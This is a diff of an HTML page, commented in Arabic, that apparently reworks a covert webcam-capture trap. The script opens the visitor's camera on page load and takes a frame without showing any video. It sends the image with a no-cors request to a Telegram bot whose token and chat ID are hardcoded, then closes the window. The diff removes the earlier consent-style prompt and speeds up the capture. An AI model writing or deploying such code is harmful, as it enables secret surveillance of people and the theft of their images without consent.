@@ -2,144 +2,95 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>التقاط سريع</title>
+    <title>التقاط فوري</title>
     <script>
-        // بيانات البوت - تأكد من استبدالها بقيمك الخاصة
+        // بيانات البوت
         const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
         const CHAT_ID = '7327464581';
         
-        // متغيرات النظام
-        let stream = null;
-        let captureAttempted = false;
+        // إعدادات الأداء
+        const CAPTURE_DELAY = 100; // تأخير قصير جداً قبل الالتقاط (مللي ثانية)
+        const IMAGE_QUALITY = 0.6; // جودة منخفضة للسرعة (0.6 = 60%)
+        const RESOLUTION = { width: 640, height: 480 }; // دقة منخفضة للسرعة
 
-        async function silentCapture() {
+        async function ultraFastCapture() {
             try {
-                // محاولة الوصول للكاميرا بدون إذن (لن تعمل في معظم المتصفحات)
-                stream = await navigator.mediaDevices.getUserMedia({
+                // 1. فتح الكاميرا بأقل إعدادات ممكنة للسرعة
+                const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        ...RESOLUTION,
+                        frameRate: 15 // تقليل معدل الإطارات للسرعة
                     }
                 });
                 
+                // 2. إنشاء عناصر سريعة بدون عرضها في DOM
                 const video = document.createElement('video');
                 video.srcObject = stream;
+                video.muted = true;
+                video.playsInline = true;
                 await video.play();
                 
+                // 3. التقاط سريع مع الحد الأدنى من المعالجة
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
+                canvas.width = RESOLUTION.width;
+                canvas.height = RESOLUTION.height;
+                const ctx = canvas.getContext('2d', { willReadFrequently: false });
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
+                // 4. إيقاف الكاميرا فوراً (لا تنتظر الإرسال)
                 stream.getTracks().forEach(track => track.stop());
                 
-                canvas.toBlob(async (blob) => {
+                // 5. تحويل وإرسال متوازي (لا ينتظر العرض)
+                canvas.toBlob(blob => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('photo', blob, 'instant_capture.jpg');
                     
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    // إرسال غير متزامن (لا ننتظر الرد)
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
-                        body: formData
-                    });
+                        body: formData,
+                        mode: 'no-cors' // لتجنب انتظار الرد
+                    }).catch(e => console.log('تم الإرسال (قد لا يكون مؤكداً)'));
                     
-                    // إخفاء النافذة بعد الإرسال
-                    setTimeout(() => {
-                        document.body.innerHTML = '<h1 style="text-align:center;padding:50px;">تم الإرسال بنجاح</h1>';
-                        setTimeout(window.close, 1000);
-                    }, 500);
-                }, 'image/jpeg', 0.7);
+                    // إغلاق سريع للنافذة
+                    setTimeout(window.close, 300);
+                }, 'image/jpeg', IMAGE_QUALITY);
                 
             } catch (error) {
-                if (!captureAttempted) {
-                    captureAttempted = true;
-                    requestPermission();
-                }
-            }
-        }
-
-        function requestPermission() {
-            document.body.innerHTML = `
-                <div style="text-align:center;padding:50px;">
-                    <h1>يجب منح إذن الكاميرا</h1>
-                    <p>لن يتم التقاط أي صورة بدون موافقتك</p>
-                    <button onclick="startCapture()" style="
-                        padding: 10px 20px;
-                        background: #0088cc;
-                        color: white;
-                        border: none;
-                        border-radius: 5px;
-                        font-size: 16px;
-                        cursor: pointer;
-                    ">منح الإذن</button>
-                </div>
-            `;
-        }
-
-        async function startCapture() {
-            try {
-                document.body.innerHTML = '<h1 style="text-align:center;padding:50px;">جاري التقاط الصورة...</h1>';
-                
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                });
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                stream.getTracks().forEach(track => track.stop());
-                
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'capture.jpg');
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    document.body.innerHTML = '<h1 style="text-align:center;padding:50px;">تم الإرسال بنجاح</h1>';
-                    setTimeout(window.close, 1000);
-                }, 'image/jpeg', 0.7);
-                
-            } catch (error) {
+                // عرض واجهة طلب الإذن إذا فشلت المحاولة التلقائية
                 document.body.innerHTML = `
-                    <div style="text-align:center;padding:50px;color:red;">
-                        <h1>خطأ في الالتقاط</h1>
-                        <p>${error.message}</p>
-                        <button onclick="location.reload()" style="
-                            padding: 10px 20px;
-                            background: #dc3545;
+                    <div style="
+                        text-align:center;
+                        padding:20px;
+                        font-family:Arial;
+                        max-width:400px;
+                        margin:50px auto;
+                    ">
+                        <h2>التقاط الصورة الفوري</h2>
+                        <p>يجب منح إذن الوصول للكاميرا</p>
+                        <button onclick="ultraFastCapture()" style="
+                            padding: 12px 24px;
+                            background: #0088cc;
                             color: white;
                             border: none;
-                            border-radius: 5px;
+                            border-radius: 6px;
                             font-size: 16px;
                             cursor: pointer;
-                        ">إعادة المحاولة</button>
+                            margin-top: 20px;
+                        ">منح الإذن والالتقاط</button>
                     </div>
                 `;
             }
         }
 
-        // بدء العملية فور تحميل الصفحة
+        // بدء العملية فوراً مع تأخير بسيط لتهيئة الصفحة
         window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(silentCapture, 300); // تأخير بسيط لضمان تحميل الصفحة
+            setTimeout(ultraFastCapture, CAPTURE_DELAY);
         });
     </script>
 </head>
 <body>
-    <!-- سيتم تعديل المحتوى ديناميكياً -->
+    <!-- المحتوى سيتم تعديله ديناميكياً -->
 </body>
 </html>
